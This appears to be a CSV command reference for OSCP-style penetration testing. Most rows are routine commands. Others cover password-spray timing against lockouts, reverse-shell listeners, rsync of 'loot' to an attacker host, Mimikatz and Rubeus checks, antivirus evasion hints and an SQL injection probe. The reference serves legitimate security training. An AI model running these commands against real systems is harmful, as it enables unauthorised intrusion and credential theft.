"concept-calculation","Calculate Safe Limits","utilities","# Manual calculation - determine safe password spray limits from lockout policy","Conceptual step: Calculate conservative safe spray limits based on lockout threshold and observation window. Formula: safe_attempts = threshold - 2, wait_time = observation_window + 5min buffer.","","","Critical safety calculation for password spraying. Conservative approach subtracts 2 from threshold to account for user's own failed logins and timing uncertainty.","medium","","","","","","","",""
"concept-wait-timer","Wait for Observation Window","utilities","# Manual wait - observation window + buffer to ensure counter resets","Conceptual step: Wait for full observation window plus 5-minute buffer before next spray round. Use productive time for alternative enumeration and attacks.","","","Not a command but a mandatory waiting period between password spray rounds. Critical for avoiding account lockouts. Use wait time productively for Kerberoasting, AS-REP roasting, etc.","medium","","","","","","","",""
"apt-install","Install Package with APT","custom","sudo apt install -y <PACKAGE>","Install Debian/Ubuntu package using apt package manager","","sudo apt install -y nmap","Essential for installing tools on Debian-based systems (Kali, Ubuntu, Parrot)","high","","","","","{""-y"": ""Automatic yes to prompts"", ""--no-install-recommends"": ""Don't install recommended packages (minimal install)""}","[""apt-update""]","",""
"apt-update","Update Package List","custom","sudo apt update","Update available package list from repositories","","","Run before apt install to ensure latest package versions","medium","","","","","","","","[""apt-upgrade"", ""apt-install""]"
"apt-upgrade","Upgrade Installed Packages","custom","sudo apt upgrade -y","Upgrade all installed packages to latest versions","","","Use before OSCP exam to ensure all tools are up-to-date","low","","","","","{""-y"": ""Automatic yes to prompts""}","[""apt-update""]","",""
"pip-install","Install Python Package (pip)","custom","pip install <PACKAGE>","Install Python package using pip (Python 2.x)","","pip install impacket","Many exploits require Python packages - impacket, requests, etc.","high","","","","","{""--user"": ""Install to user directory (no sudo required)"", ""--upgrade"": ""Upgrade if already installed"", ""-r"": ""Install from requirements file""}","","[""pip3-install""]",""
"pip3-install","Install Python 3 Package","custom","pip3 install <PACKAGE>","Install Python package using pip3 (Python 3.x)","","pip3 install pwntools","Prefer pip3 over pip for modern Python tools","high","","","","","{""--user"": ""Install to user directory (no sudo required)"", ""--upgrade"": ""Upgrade if already installed"", ""-r"": ""Install from requirements file""}","","[""pip-install""]",""
"npm-install","Install Node Package","custom","npm install <PACKAGE>","Install Node.js package using npm","","npm install express","Occasionally needed for Node.js exploits or tools","low","","","","","{""-g"": ""Install globally (requires sudo)"", ""--save"": ""Add to package.json dependencies"", ""--save-dev"": ""Add to devDependencies""}","","",""
"gem-install","Install Ruby Gem","custom","gem install <GEM>","Install Ruby gem package","","gem install winrm","Useful for evil-winrm and other Ruby-based tools","medium","","","","","{""--user-install"": ""Install to user directory"", ""--no-document"": ""Skip documentation generation (faster)""}","","",""
"yum-install","Install Package with YUM","custom","sudo yum install -y <PACKAGE>","Install RHEL/CentOS package using yum","","sudo yum install -y nmap","For Red Hat-based systems (less common in OSCP)","low","","","","","{""-y"": ""Automatic yes to prompts""}","","[""dnf-install"", ""apt-install""]",""
"dnf-install","Install Package with DNF","custom","sudo dnf install -y <PACKAGE>","Install Fedora/RHEL 8+ package using dnf","","sudo dnf install -y nmap","","low","","","","","{""-y"": ""Automatic yes to prompts""}","","[""yum-install"", ""apt-install""]",""
"brew-install","Install Package with Homebrew","custom","brew install <PACKAGE>","Install macOS package using Homebrew","","brew install nmap","For macOS users preparing for OSCP","low","","","","","","","",""
"cargo-install","Install Rust Package","custom","cargo install <PACKAGE>","Install Rust package using cargo","","cargo install feroxbuster","Useful for modern tools like feroxbuster, rustscan","low","","","","","","","",""
"go-get","Install Go Package","custom","go get <PACKAGE>","Install Go package (deprecated - use go install)","","go get github.com/OJ/gobuster/v3@latest","Deprecated - use go install instead","low","","","","","","","[""go-install""]",""
"go-install","Install Go Binary","custom","go install <PACKAGE>@latest","Install Go package binary (modern way)","","go install github.com/OJ/gobuster/v3@latest","Preferred over go get for tools like gobuster, ffuf","low","","","","","","","[""go-get""]",""
"choco-install","Install with Chocolatey (Windows)","custom","choco install <PACKAGE> -y","Install Windows package using Chocolatey","","choco install nmap -y","For setting up Windows attack box","low","","","","","{""-y"": ""Automatic yes to prompts""}","","[""winget-install""]",""
"winget-install","Install with Winget (Windows)","custom","winget install <PACKAGE>","Install Windows package using winget","","winget install Nmap.Nmap","Built into Windows 10/11 - no additional setup required","low","","","","","{""-e"": ""Exact match"", ""-i"": ""Interactive mode"", ""-h"": ""Silent install""}","","[""choco-install""]",""
"scoop-install","Install with Scoop (Windows)","custom","scoop install <PACKAGE>","Install Windows package using Scoop","","scoop install nmap","User-focused package manager - no admin rights required","low","","","","","","","[""choco-install"", ""winget-install""]",""
"ping-host","Ping Host","recon","ping -c <COUNT> <TARGET>","Test network connectivity using ICMP echo requests","","ping -c 4 192.168.1.1","First test for connectivity - note Windows uses -n instead of -c","high","","","","","{""-c"": ""Count - number of packets to send (default: infinite on Linux)"", ""-i"": ""Interval between packets in seconds"", ""-W"": ""Timeout in seconds""}","","[""nmap-ping-sweep"", ""traceroute-host""]","[""nmap-quick-scan"", ""nmap-service-scan""]"
"traceroute-host","Trace Route to Host","recon","traceroute <TARGET>","Trace network path to target showing all hops","","traceroute 192.168.1.1","Useful for understanding network topology and firewall positions","medium","","","","","{""-n"": ""No DNS resolution (faster)"", ""-m"": ""Maximum TTL hops"", ""-p"": ""Base port number""}","","[""tracert-windows""]",""
"tracert-windows","Trace Route (Windows)","recon","tracert <TARGET>","Windows traceroute implementation","","tracert 192.168.1.1","","medium","","","","","{""-d"": ""No DNS resolution"", ""-h"": ""Maximum hops""}","","[""traceroute-host""]",""
"dig-dns","DNS Lookup with Dig","recon","dig <DOMAIN> <TYPE>","Perform DNS query using dig","","dig example.com A","Essential for DNS enumeration and zone transfer attempts","high","","","","","{""+short"": ""Short output - just the answer"", ""+noall +answer"": ""Clean output with only answer section"", ""@<server>"": ""Query specific DNS server"", ""axfr"": ""Zone transfer attempt""}","","[""nslookup-dns"", ""host-dns""]",""
"nslookup-dns","DNS Query with Nslookup","recon","nslookup <DOMAIN>","Query DNS records using nslookup","","nslookup example.com","Cross-platform DNS tool - works on Windows and Linux","high","","","","","","","[""dig-dns"", ""host-dns""]",""
"host-dns","DNS Lookup with Host","recon","host <DOMAIN>","Simple DNS lookup utility","","host example.com","Simpler than dig - good for quick lookups","high","","","","","{""-t"": ""Query specific record type"", ""-a"": ""All records (equivalent to ANY)""}","","[""dig-dns"", ""nslookup-dns""]",""
"whois-domain","WHOIS Lookup","recon","whois <DOMAIN>","Query WHOIS information for domain or IP","","whois example.com","Useful for identifying domain registrar, nameservers, contact info","medium","","","","","","","",""
"curl-url","Fetch URL with Curl","web","curl <URL>","Transfer data from or to a server using various protocols","","curl http://example.com","Essential for web enumeration, API testing, and file downloads","high","","","","","{""-o"": ""Save output to file"", ""-O"": ""Save with remote filename"", ""-s"": ""Silent mode"", ""-v"": ""Verbose output with headers"", ""-I"": ""Fetch headers only"", ""-X"": ""Specify HTTP method (GET, POST, PUT, etc.)"", ""-d"": ""Send POST data"", ""-H"": ""Add custom header"", ""-u"": ""Specify username:password for auth"", ""-k"": ""Ignore SSL certificate errors"", ""-L"": ""Follow redirects""}","","[""wget-url""]",""
"wget-url","Download with Wget","web","wget <URL>","Download files from web servers","","wget http://example.com/file.txt","Simpler than curl for basic downloads - great for transferring files to targets","high","","","","","{""-O"": ""Save as specific filename"", ""-r"": ""Recursive download"", ""-np"": ""No parent - don't ascend to parent directory"", ""-nc"": ""No clobber - don't overwrite existing files"", ""--no-check-certificate"": ""Ignore SSL errors"", ""-q"": ""Quiet mode"", ""-P"": ""Save to specific directory""}","","[""curl-url""]",""
"nc-listener","Netcat Listener","exploitation","nc -lvnp <PORT>","Start netcat listener for reverse shells","","nc -lvnp 4444","Essential for catching reverse shells - run before triggering exploit","high","","","","","{""-l"": ""Listen mode"", ""-v"": ""Verbose output"", ""-n"": ""No DNS resolution"", ""-p"": ""Specify port""}","","[""nc-listener-setup"", ""msf-handler-setup"", ""msf-handler-background""]","[""python-shell-upgrade"", ""linpeas-run"", ""winpeas-run""]"
"nc-connect","Netcat Connection","exploitation","nc <TARGET> <PORT>","Connect to remote host using netcat","","nc 192.168.1.1 80","Useful for manual service interaction and banner grabbing","high","","","","","{""-v"": ""Verbose output"", ""-n"": ""No DNS resolution"", ""-z"": ""Zero-I/O mode (port scanning)""}","","[""telnet-connect"", ""curl-url""]",""
"ssh-connect","SSH Connection","exploitation","ssh <USER>@<TARGET>","Connect to remote host via SSH","","ssh root@192.168.1.1","Essential for accessing compromised hosts and port forwarding","high","","","","","{""-p"": ""Specify port (default 22)"", ""-i"": ""Specify private key file"", ""-L"": ""Local port forwarding"", ""-R"": ""Remote port forwarding"", ""-D"": ""Dynamic port forwarding (SOCKS proxy)"", ""-N"": ""No command execution (forwarding only)"", ""-f"": ""Background mode"", ""-o"": ""Set options (e.g., -o StrictHostKeyChecking=no)""}","[""hydra-ssh""]","[""evil-winrm-shell""]","[""linpeas-run"", ""linenum-run"", ""scp-file""]"
"scp-file","Secure Copy","file-transfer","scp <SOURCE> <USER>@<TARGET>:<DEST>","Securely copy files between hosts using SSH","","scp exploit.sh root@192.168.1.1:/tmp/exploit.sh","Fast file transfer when SSH access is available","high","","","","","{""-P"": ""Specify port"", ""-i"": ""Specify private key file"", ""-r"": ""Recursive copy for directories""}","","[""rsync-files""]",""
"rsync-files","Rsync Files","file-transfer","rsync -avz <SOURCE> <USER>@<TARGET>:<DEST>","Synchronize files between systems efficiently","","rsync -avz /tmp/loot/ kali@192.168.45.xxx:/home/kali/exfil/","More efficient than scp for large transfers or syncing directories","medium","","","","","{""-a"": ""Archive mode (preserves permissions, timestamps, etc.)"", ""-v"": ""Verbose output"", ""-z"": ""Compress during transfer"", ""-P"": ""Show progress and keep partial transfers"", ""--delete"": ""Delete files in destination not in source""}","","[""scp-file""]",""
"telnet-connect","Telnet Connection","enumeration","telnet <TARGET> <PORT>","Connect to remote host using telnet protocol","","telnet 192.168.1.1 23","Useful for banner grabbing and manual service interaction","medium","","","","","","","[""nc-connect""]",""
"ftp-connect","FTP Connection","enumeration","ftp <TARGET>","Connect to FTP server","","ftp 192.168.1.1","Try anonymous login (user:
anonymous, pass:
anonymous@example.com)","medium","","","","","","","",""
"nmap-udp-scan","Nmap UDP Port Scan","enumeration","nmap -sU -p <PORT> <TARGET>","Scan UDP ports to verify service availability (commonly used for Kerberos port 88)","","nmap -sU -p 88 192.168.1.10","UDP scanning is slower and less reliable than TCP. Use -Pn flag to skip host discovery if needed. Common for verifying Kerberos (88/udp), DNS (53/udp), SNMP (161/udp).","high","","","","","{""-sU"": ""UDP scan - scans UDP ports instead of TCP (slower than TCP scans)"", ""-p"": ""Port specification - specify which port(s) to scan""}","[""nmap-quick-scan""]","","[""nmap-service-scan"", ""snmp-enum""]"
"mkdir-directory","Create Directory","custom","mkdir -p <PATH>","Create directory with parent directories if they don't exist","","mkdir -p /tmp/output","Essential for organizing enumeration output and creating staging directories","medium","","","","","{""-p"": ""Create parent directories as needed, no error if directory exists""}","","",""
"chmod-executable","Make File Executable","custom","chmod +x <FILE>","Add execute permission to file for all users","","chmod +x exploit.sh","Required for running scripts, exploits, and compiled binaries","high","","","","","{""+x"": ""Add execute permission for user, group, and others""}","","[""chmod-numeric-permissions""]",""
"chmod-numeric-permissions","Set Numeric Permissions","custom","chmod <PERMS> <FILE>","Set file permissions using numeric (octal) notation","","chmod 755 script.sh","Common permissions:
755 for executables, 644 for files, 700 for sensitive scripts","medium","","","","","{""755"": ""rwxr-xr-x - Owner: read/write/execute, Others: read/execute"", ""644"": ""rw-r--r-- - Owner: read/write, Others: read-only"", ""777"": ""rwxrwxrwx - Full permissions for all (dangerous)""}","","[""chmod-executable""]",""
"chmod-writable","Make File Writable","custom","chmod +w <FILE>","Add write permission to file","","chmod +w config.txt","","medium","","","","","{""+w"": ""Add write permission for user, group, and others""}","","[""chmod-numeric-permissions""]",""
"chown-file","Change File Ownership","custom","chown <USER>:<GROUP> <FILE>","Change file or directory owner and group","","chown www-data:www-data /var/www/shell.php","Useful after uploading web shells or modifying system files","medium","","","","","{""-R"": ""Recursively change ownership of directories and contents""}","","",""
"cp-file","Copy File","custom","cp <SOURCE> <DEST>","Copy files or directories","","cp /usr/share/exploits/shell.php /tmp/shell.php","","medium","","","","","{""-r"": ""Copy directories recursively"", ""-p"": ""Preserve file attributes (permissions, timestamps)"", ""-v"": ""Verbose output""}","","[""rsync-files""]",""
"mv-file","Move/Rename File","custom","mv <SOURCE> <DEST>","Move or rename files and directories","","mv exploit.py exploit_backup.py","","medium","","","","","{""-i"": ""Interactive - prompt before overwrite"", ""-v"": ""Verbose output""}","","",""
"rm-file","Remove File","custom","rm <FILE>","Delete files or directories","","rm /tmp/exploit.py","Be careful with rm -rf, especially as root - can destroy systems","medium","","","","","{""-r"": ""Remove directories and contents recursively"", ""-f"": ""Force removal without prompts"", ""-i"": ""Interactive - prompt before each removal""}","","",""
"touch-file","Create Empty File","custom","touch <FILE>","Create empty file or update timestamp of existing file","","touch /tmp/test.txt","Useful for testing write permissions or creating placeholder files","low","","","","","","","",""
"ln-symbolic","Create Symbolic Link","custom","ln -s <TARGET> <LINK>","Create symbolic link pointing to target file or directory","","ln -s /usr/share/wordlists/rockyou.txt rockyou.txt","Useful for path traversal exploits or creating convenient shortcuts","medium","","","","","{""-s"": ""Create symbolic (soft) link instead of hard link"", ""-f"": ""Force - remove existing destination files""}","","",""
"find-files","Find Files by Pattern","enumeration","find <PATH> -name <PATTERN>","Search for files matching pattern in directory tree","","find /var/www -name ""*.php""","Essential for privilege escalation - finding SUID binaries, writable files, config files","high","","","","","{""-name"": ""Case-sensitive filename match"", ""-iname"": ""Case-insensitive filename match"", ""-type f"": ""Find only files (not directories)"", ""-type d"": ""Find only directories"", ""-perm"": ""Find files with specific permissions"", ""-user"": ""Find files owned by user"", ""-size"": ""Find files by size""}","","","[""strings-file""]"
"cat-file","Display File Contents","custom","cat <FILE>","Concatenate and display file contents to stdout","","cat /etc/passwd","Most common way to read files - essential for reading flags, configs, source code","high","","","","","","","[""head-file"", ""tail-file"", ""less-file""]",""
"grep-file","Search File Contents","enumeration","grep <PATTERN> <FILE>","Search for pattern in file contents","","grep password /etc/config.conf","Critical for finding credentials, API keys, sensitive data in files","high","","","","","{""-i"": ""Case-insensitive search"", ""-r"": ""Recursive directory search"", ""-n"": ""Show line numbers"", ""-v"": ""Invert match (show non-matching lines)"", ""-E"": ""Extended regex"", ""-o"": ""Show only matching part of line""}","","[""grep-r-etc"", ""linux-suid-find""]","[""cat-file"", ""grep-r-etc""]"
"head-file","Display First Lines","custom","head -n <LINES> <FILE>","Display first N lines of file","","head -n 10 log.txt","","medium","","","","","{""-n"": ""Number of lines (default 10)""}","","[""cat-file"", ""less-file""]",""
"tail-file","Display Last Lines","custom","tail -n <LINES> <FILE>","Display last N lines of file","","tail -n 10 log.txt","tail -f is essential for monitoring logs during exploitation","medium","","","","","{""-n"": ""Number of lines (default 10)"", ""-f"": ""Follow - continuously display new lines as they're added (useful for logs)""}","","[""cat-file"", ""less-file""]",""
"less-file","View File with Pager","custom","less <FILE>","View file contents with scrolling and search capabilities","","less large_file.txt","Better than cat for large files - supports search with /, quit with q","medium","","","","","","","[""cat-file""]",""
"wc-file","Count Lines/Words/Characters","custom","wc <FILE>","Count lines, words, and characters in file","","wc wordlist.txt","Useful for checking wordlist sizes or output lengths","low","","","","","{""-l"": ""Count only lines"", ""-w"": ""Count only words"", ""-c"": ""Count only bytes/characters""}","","",""
"tar-extract","Extract Tar Archive","custom","tar -xvf <FILE>","Extract tar archive (supports .tar, .tar.gz, .tgz)","","tar -xvf exploit.tar.gz","Common for extracting exploit code or downloaded tools","medium","","","","","{""-x"": ""Extract files from archive"", ""-v"": ""Verbose - show files being extracted"", ""-f"": ""Specify filename"", ""-z"": ""Filter through gzip (for .tar.gz)"", ""-j"": ""Filter through bzip2 (for .tar.bz2)"", ""-C"": ""Extract to specific directory""}","","[""unzip-file"", ""gunzip-decompress""]",""
"tar-create","Create Tar Archive","custom","tar -czvf <OUTPUT> <FILES>","Create compressed tar archive","","tar -czvf backup.tar.gz /tmp/loot/*","Useful for exfiltrating multiple files or creating backups","medium","","","","","{""-c"": ""Create new archive"", ""-z"": ""Compress with gzip"", ""-v"": ""Verbose output"", ""-f"": ""Specify filename""}","","",""
"unzip-file","Extract Zip Archive","custom","unzip <FILE>","Extract zip archive","","unzip exploit.zip","","medium","","","","","{""-d"": ""Extract to specific directory"", ""-l"": ""List contents without extracting"", ""-o"": ""Overwrite files without prompting"", ""-q"": ""Quiet mode""}","","[""tar-extract""]",""
"gzip-compress","Compress with Gzip","custom","gzip <FILE>","Compress file with gzip (creates .gz file)","","gzip large_file.txt","","low","","","","","{""-k"": ""Keep original file (don't delete)"", ""-9"": ""Maximum compression"", ""-1"": ""Fastest compression""}","","[""tar-create""]",""
"gunzip-decompress","Decompress Gzip","custom","gunzip <FILE>","Decompress gzip file","","gunzip file.gz","","low","","","","","{""-k"": ""Keep original .gz file"", ""-c"": ""Write to stdout (keep original)""}","","[""tar-extract""]",""
"verify-ntlm-hash","Verify NTLM Hash Obtained","utilities","test -f <HASH_FILE> && grep -qE '^[a-f0-9]{32}$' <HASH_FILE>","Check if NTLM hash file exists and contains valid 32-character hexadecimal hash format","","test -f hashes.txt && grep -qE '^[a-f0-9]{32}$' hashes.txt","NTLM hash format:
lowercase hexadecimal, 32 characters.

Common sources:
secretsdump.py, mimikatz, crackmapexec --sam/--lsa","high","","","","{""File not found"": ""Ensure hash extraction completed: secretsdump.py or mimikatz"", ""Invalid hash format"": ""Verify hash is 32 hex chars, extract from full hash string (username:rid:lm:ntlm)""}","","","","[""evil-winrm-hash""]"
"verify-crackmapexec-installed","Verify CrackMapExec Installed","utilities","which crackmapexec || which cme","Verify CrackMapExec is installed and available in system PATH","","","CrackMapExec may be aliased as 'cme' in some environments.

Check both variants.","high","","","","{""Command not found"": ""sudo apt install crackmapexec -y"", ""Installation failed"": ""pipx install crackmapexec""}","","","",""
"verify-neo4j-running","Verify Neo4j Database Running","utilities","systemctl is-active neo4j || sudo neo4j status | grep -q 'Neo4j is running'","Check if Neo4j database service is running and active","","","Neo4j required for BloodHound data ingestion and Active Directory analysis.

Default ports:
7474 (HTTP), 7687 (Bolt).","medium","","","","{""Service inactive"": ""sudo systemctl start neo4j"", ""Service failed"": ""sudo systemctl status neo4j (check logs)"", ""Port conflict"": ""sudo netstat -tulnp | grep 7474 (default HTTP port)""}","","","","[""bloodhound-ingest""]"
"verify-web-server-up","Verify Web Server Responding","utilities","curl -I http://<TARGET>:<PORT> --connect-timeout 5 --max-time 10","Verify web server is responding to HTTP requests within timeout","","curl -I http://192.168.1.100:80 --connect-timeout 5 --max-time 10","","high","","","","{""Connection timeout"": ""Verify port with nmap: nmap -p <PORT> <TARGET>"", ""Connection refused"": ""Check firewall rules, verify service running"", ""HTTPS required"": ""Use curl -Ik https://<TARGET>:<PORT>""}","{""-I"": ""Fetch headers only (HEAD request)"", ""--connect-timeout 5"": ""Maximum time to establish connection"", ""--max-time 10"": ""Maximum total time for operation""}","","","[""nikto-web-scan""]"
"verify-powerview-imported","Verify PowerView Module Loaded","utilities","powershell -Command ""Get-Command Get-NetDomain -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name""","Check if PowerView module is imported and cmdlets are available in PowerShell session","","","PowerView cmdlets available after import:
Get-NetDomain, Get-NetUser, Get-NetGroup, Get-NetComputer, Invoke-ShareFinder","high","","","","{""PowerView not loaded"": ""Import-Module <PATH>\\PowerView.ps1"", ""Execution policy blocked"": ""Set-ExecutionPolicy Bypass -Scope Process"", ""Module not found"": ""Download from github.com/PowerShellMafia/PowerSploit""}","","[""import-powerview""]","","[""get-netdomain"", ""get-netuser"", ""get-netgroup""]"
"verify-impacket-installed","Verify Impacket Toolkit Installed","utilities","which secretsdump.py && which psexec.py && which GetNPUsers.py","Verify Impacket toolkit is installed with core scripts available","","","Impacket pre-installed on Kali.

Core scripts:
secretsdump.py, psexec.py, smbexec.py, wmiexec.py, GetNPUsers.py, GetUserSPNs.py","high","","","","{""Impacket not found"": ""sudo apt install python3-impacket -y"", ""Scripts not in PATH"": ""pipx install impacket"", ""Permission denied"": ""Add ~/.local/bin to PATH""}","","","",""
"verify-evil-winrm-installed","Verify Evil-WinRM Installed","utilities","which evil-winrm","Verify Evil-WinRM tool is installed and available for WinRM access","","","Evil-WinRM provides interactive PowerShell remote shell over WinRM (port 5985 HTTP, 5986 HTTPS)","high","","","","{""Evil-WinRM not found"": ""sudo gem install evil-winrm"", ""Ruby not installed"": ""sudo apt install ruby ruby-dev -y""}","","","","[""evil-winrm-hash""]"
"verify-nmap-installed","Verify Nmap Installed","utilities","which nmap","Verify Nmap network scanner is installed and available","","","Nmap pre-installed on Kali Linux.

Essential for port scanning and service enumeration.","high","","","","{""Nmap not found"": ""sudo apt install nmap -y""}","","","","[""nmap-vuln-scan""]"
"verify-mimikatz-available","Verify Mimikatz Available","utilities","test -f <MIMIKATZ_PATH>/mimikatz.exe","Check if Mimikatz executable exists at specified path on Windows host","","test -f C:\Tools\Mimikatz/mimikatz.exe","Mimikatz extracts plaintext passwords, hashes, tickets from memory.

Requires SYSTEM/Admin privileges.","high","","","","{""File not found"": ""Download from github.com/gentilkiwi/mimikatz/releases"", ""Transfer failed"": ""Use certutil -urlcache or impacket-smbserver"", ""AV detection"": ""Disable AV or use obfuscated version""}","","","",""
"verify-rubeus-available","Verify Rubeus.exe Available","utilities","test -f <RUBEUS_PATH>/Rubeus.exe","Check if Rubeus.exe Kerberos toolkit exists at specified path on Windows host","","test -f C:\Tools\Rubeus/Rubeus.exe","Rubeus is C# toolkit for Kerberos attacks:
ASREPRoasting, Kerberoasting, overpass-the-hash, ticket manipulation","high","","","","{""File not found"": ""Download from github.com/GhostPack/Rubeus"", ""Compilation required"": ""Compile with Visual Studio or use pre-compiled release"", ""Transfer failed"": ""Use certutil -urlcache or SMB share""}","","","","[""rubeus-asreproast"", ""rubeus-kerberoast""]"
"verify-getcap-installed","Verify getcap Utility Installed","utilities","which getcap","Verify getcap utility is installed for enumerating Linux capabilities","","","Part of libcap2-bin package.

Used to find binaries with elevated capabilities (e.g., CAP_SETUID for privilege escalation)","medium","","","","{""getcap not found"": ""sudo apt install libcap2-bin -y""}","","","",""
"verify-docker-images-available","Verify Docker Images Available","utilities","docker images | grep -q alpine || docker pull alpine","Check if Docker images exist locally, pull alpine if none available","","","Docker privilege escalation requires existing images or ability to pull.

Alpine is minimal (5MB) and commonly available.","medium","","","","{""Docker daemon not running"": ""sudo systemctl start docker"", ""Permission denied"": ""sudo usermod -aG docker $USER (logout/login required)"", ""Network error"": ""Check internet connectivity for image pull""}","","","",""
"verify-curl-available","Verify curl or wget Available","utilities","which curl || which wget","Check if curl or wget is available for HTTP file transfers","","","curl and wget pre-installed on most Linux.

Windows 10+ includes curl.exe.

Used for downloading exploits, tools, reverse shells.","high","","","","{""Both missing"": ""Use python3 -m http.server (if Python available)"", ""Fallback option"": ""nc -lvnp <PORT> > file (manual netcat transfer)""}","","","[""python-http-server"", ""nc-file-transfer""]",""
"verify-socat-installed","Verify Socat Installed on Pivot Host","utilities","which socat","Check if socat is installed for advanced port forwarding and redirection","","","Socat is multipurpose relay tool for pivoting.

Can forward TCP/UDP, create reverse shells, port redirection.","medium","","","","{""Socat not found"": ""sudo apt install socat -y"", ""On compromised host"": ""Transfer socat binary via file transfer techniques"", ""Windows alternative"": ""Use netsh interface portproxy""}","","","","[""socat-port-forward""]"
"verify-rdp-service-running","Verify RDP Service Running on Target","utilities","nmap -p 3389 -Pn <TARGET> | grep -q 'open'","Check if Remote Desktop Protocol service is running and accessible on target","","nmap -p 3389 -Pn 192.168.1.100 | grep -q 'open'","RDP default port 3389.

Service name:
TermService (Windows).

Required for graphical remote access and lateral movement.","high","","","","{""Port filtered"": ""Check firewall rules, try from different source IP"", ""Port closed"": ""RDP disabled on target, verify service: Get-Service TermService"", ""Alternative ports"": ""Scan for non-standard RDP ports: nmap -p- <TARGET>""}","","","","[""xfreerdp-connect""]"
"verify-python-available","Verify Python Available on Host","utilities","which python3 || which python","Check if Python interpreter is available for scripting and exploitation","","","Python usually pre-installed on Linux.

Used for HTTP servers, reverse shells, exploit modifications, enumeration scripts.","high","","","","{""Python not found"": ""Check /usr/bin/python* manually"", ""Python2 only"": ""Use python2 syntax for exploits"", ""No Python"": ""Use compiled binaries or shell scripts""}","","","","[""python-http-server"", ""python-reverse-shell""]"
"verify-socks-proxy-running","Verify SOCKS Proxy Running","utilities","netstat -tulnp | grep -E ':<SOCKS_PORT>.*LISTEN'","Check if SOCKS proxy is listening on specified port for pivoting","","netstat -tulnp | grep -E ':1080.*LISTEN'","SOCKS proxy created via SSH dynamic port forwarding (ssh -D).

Configure proxychains:
/etc/proxychains4.conf","high","","","","{""Proxy not running"": ""ssh -D <SOCKS_PORT> user@pivot-host"", ""Port in use"": ""Choose different port or kill existing process"", ""Verify functionality"": ""proxychains4 nmap -sT -Pn <INTERNAL_TARGET>""}","","[""ssh-dynamic-forward""]","","[""proxychains-nmap""]"
"verify-credentials","Verify Valid Credentials","utilities","crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD>","Verify credentials are valid against target SMB service","","crackmapexec smb 192.168.1.100 -u admin -p P@ssw0rd123!","Use to validate credentials before exploitation.

SMB (port 445) most reliable for Windows credential validation.","high","","","","{""Authentication failed"": ""Verify username/password format, check account lockout"", ""Connection error"": ""Verify SMB port open: nmap -p 445 <TARGET>"", ""Alternative protocols"": ""Try WinRM: crackmapexec winrm <TARGET> -u <USERNAME> -p <PASSWORD>""}","","","[""verify-credentials"", ""verify-credentials""]",""
"verify-powershell-access","Verify PowerShell Access on Windows Host","utilities","powershell -Command ""$PSVersionTable.PSVersion""","Check if PowerShell is accessible and display version information","","","PowerShell v2+ on Windows 7+, v5.1 on Windows 10/Server 2016+.

Required for most Windows enumeration and exploitation scripts.","high","","","","{""PowerShell not found"": ""Verify Windows version (PowerShell included since Windows 7)"", ""Execution policy blocked"": ""powershell -ExecutionPolicy Bypass -Command ..."", ""Restricted environment"": ""Use cmd.exe alternatives or AppLocker bypass techniques""}","","","","[""import-powerview"", ""invoke-mimikatz-remote""]"
"verify-network-connectivity","Verify Network Connectivity to Target","utilities","ping -c 4 <TARGET> || nc -zv <TARGET> <PORT>","Check basic network connectivity to target via ICMP or TCP","","ping -c 4 192.168.1.100 || nc -zv 192.168.1.100 80","","high","","","","{""ICMP blocked"": ""Use TCP probe: nc -zv <TARGET> <PORT>"", ""All ports filtered"": ""Verify routing, check firewall rules"", ""DNS resolution failed"": ""Use IP address instead of hostname""}","{""-c 4"": ""Send 4 ICMP echo requests"", ""-z"": ""Zero-I/O mode (scanning)"", ""-v"": ""Verbose output""}","","",""
"verify-root-access","Verify Root/Administrator Access","utilities","id | grep -qE '(uid=0|root)' || whoami /groups | grep -qE '(Administrators|BUILTIN\\Administrators)'","Check if current user has root (Linux) or Administrator (Windows) privileges","","","Many post-exploitation tools require elevated privileges.

Linux:
uid=0, Windows:
Administrators/SYSTEM/Domain Admins groups.","high","","","","{""Not root/admin"": ""Run privilege escalation enumeration: linpeas.sh or winpeas.exe"", ""Linux sudo check"": ""sudo -l (check allowed commands)"", ""Windows UAC"": ""Use administrator shell or bypass UAC""}","","","",""
"verify-file-exists","Verify File Exists","utilities","test -f <FILE_PATH>","Check if specified file exists and is a regular file (not directory)","","test -f /tmp/file.txt","test -f checks for regular files.

Use -d for directories, -e for any file type (file/dir/symlink).","medium","","","","{""File not found"": ""Verify path with ls -la <DIRECTORY>"", ""Is a directory"": ""Use test -d <FILE_PATH> to check for directories"", ""Permission denied"": ""Check read permissions: ls -l <FILE_PATH>""}","","","",""
"verify-port-open","Verify Port Open on Target","utilities","nc -zv <TARGET> <PORT>","Check if specified TCP port is open and accepting connections","","nc -zv 192.168.1.100 445","","high","","","","{""Connection refused"": ""Port closed, verify service running"", ""Timeout"": ""Port filtered by firewall, try nmap -Pn"", ""Alternative check"": ""nmap -p <PORT> -Pn <TARGET>""}","{""-z"": ""Zero-I/O mode (scan only, no data transfer)"", ""-v"": ""Verbose output showing connection status""}","","[""nmap-port-check""]",""
"verify-sql-injection-vulnerable","Verify SQL Injection Vulnerability","utilities","sqlmap -u ""http://<TARGET>/<ENDPOINT>?<PARAM>=<VALUE>"" --batch --dbs --level=1 --risk=1","Test if parameter is vulnerable to SQL injection using automated sqlmap scan","","sqlmap -u ""http://192.168.1.100/login.php?id=1"" --batch --dbs --level=1 --risk=1","","high","","","","{""False negative"": ""Increase level: --level=5 --risk=3"", ""Manual test"": ""Try ' OR 1=1-- in parameter"", ""POST parameters"": ""Use -r request.txt (capture with Burp)""}","{""--batch"": ""Non-interactive mode (accept defaults)"", ""--dbs"": ""Enumerate databases if vulnerable"", ""--level=1"": ""Test thoroughness (1-5, default 1)"", ""--risk=1"": ""Risk of interference (1-3, default 1)""}","","","[""sqli-union-mysql-info""]"
"verify-smb-null-session","Verify SMB Null Session Allowed","utilities","smbclient -N -L //<TARGET>","Check if target allows SMB null session for anonymous share enumeration","","smbclient -N -L //192.168.1.100","Null sessions deprecated post-Windows 2000 but sometimes enabled on legacy systems.

IPC$ share indicates anonymous access.","high","","","","{""Access denied"": ""Null sessions disabled (Windows default post-2000)"", ""Alternative enumeration"": ""enum4linux -a <TARGET> (tries multiple protocols)"", ""Credential-based"": ""smbclient -U <USERNAME> -L //<TARGET>""}","{""-N"": ""Suppress password prompt (null authentication)"", ""-L"": ""List available shares on target""}","","[""smb-crackmapexec-shares""]","[""smbmap-enumerate-auth""]"
